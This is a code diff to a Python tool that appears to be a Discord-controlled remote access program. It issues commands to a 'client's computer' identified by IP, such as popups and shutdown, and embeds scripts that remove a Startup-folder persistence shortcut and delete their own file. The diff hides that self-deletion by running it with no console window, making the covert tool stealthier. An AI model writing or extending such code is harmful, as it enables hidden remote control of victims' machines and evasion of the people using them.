@@ -361,7 +361,12 @@ shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 os.remove(shortcut_path)
 file_path = __file__
-os.system(f'cmd /c timeout 2 & del "{file_path}"')
+
+subprocess.Popen(
+    f'cmd /c timeout 2 & del "{file_path}"',
+    shell=True,
+    creationflags=subprocess.CREATE_NO_WINDOW
+)
 
 sys.exit(0)
 """
@@ -387,6 +392,7 @@ import os
 from pathlib import Path
 import time
 import sys
+import subprocess
 
 time.sleep(1)
 
@@ -399,7 +405,12 @@ shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 os.remove(shortcut_path)
 file_path = __file__
-os.system(f'cmd /c timeout 2 & del "{file_path}"')
+
+subprocess.Popen(
+    f'cmd /c timeout 2 & del "{file_path}"',
+    shell=True,
+    creationflags=subprocess.CREATE_NO_WINDOW
+)
 
 sys.exit(0)
 """
@@ -489,7 +500,7 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
         
         await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
 
-@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
+@client.slash_command(guild_ids=testServerId, description="Outputs the log file, useful for debugging.")
 async def output_log(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
